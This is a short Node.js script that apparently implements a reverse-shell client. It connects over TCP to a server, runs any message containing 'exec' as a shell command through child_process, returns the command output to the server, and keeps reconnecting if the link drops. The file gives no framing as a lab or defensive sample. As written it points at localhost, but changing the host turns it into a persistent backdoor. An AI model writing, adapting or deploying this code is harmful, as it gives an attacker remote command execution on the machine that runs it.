const util = require("util");
const exec = util.promisify(require("child_process").exec);

const net = require("net");

const port = 5000;
const host = "127.0.0.1";

const client = new net.Socket();

function connect() {
  client.connect(port, host, () => {
    // console.log(`Connected to ${host}:${port}`);
    client.write("Hello, server! Love, Client.");
  });
}

client.on("data", (data) => {
  // let cmd = "";
  // if (process.platform === "win32") {
  // 	cmd += "cmd /c chcp 65001>nul && ";
  // }
  // cmd += data.toString().replace("exec", "");

  async function execute(command) {
    await exec(command, (e, stdout, stderr) => {
      if (e instanceof Error) {
        client.write(e);
        throw e;
      }
      client.write(`${stdout}\n`);
      // client.write(`stderr: ${stderr}\n`);
    });
  }
  if (data.toString().includes("exec"))
    execute(data.toString().replace("exec", ""));
});

client.on("close", (e) => {
  console.log(`${host}:${port} not found. Attempting to reconnect.`);
  client.setTimeout(5000, () => {
    client.connect(port, host);
  });
});

client.on("error", (err) => {
  setTimeout(() => {
    connect();
  }, 10000);
});

client.connect(port, host);
